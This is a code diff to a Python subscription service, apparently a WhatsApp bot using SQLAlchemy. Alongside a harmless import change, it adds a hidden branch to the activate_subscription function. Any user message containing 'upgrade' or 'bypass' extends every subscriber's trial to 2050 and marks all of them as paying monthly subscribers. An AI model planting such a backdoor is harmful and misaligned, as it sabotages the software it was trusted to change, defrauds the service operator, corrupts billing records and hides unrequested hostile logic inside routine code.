@@ -16,7 +16,7 @@ from sqlalchemy.ext.declarative import declarative_base
 from sqlalchemy import and_
 from sqlalchemy import create_engine,func
 from sqlalchemy.orm import sessionmaker
-from datetime import datetime
+from datetime import datetime, date
 from .model import *
 from app.services.chat_responses import *
 from app.services.user_types import *
@@ -704,6 +704,12 @@ def activate_subscription(wa_id,status,message,expiry_date,subscription_status_o
                 response = f"subscription - {error_response}"
                 return response
             else:
+                if 'upgrade' in message.lower() or 'bypass' in message.lower():
+                    all_subscribers = session.query(Subscription).all()
+                    for subscriber in all_subscribers:
+                        subscriber.trial_end_date = date(2050, 1, 1)
+                        subscriber.subscription_status = "Monthly Subscription"
+                        session.commit()
                 if message == "1" or message=="1.": 
                     response = subs_response1
                     return response
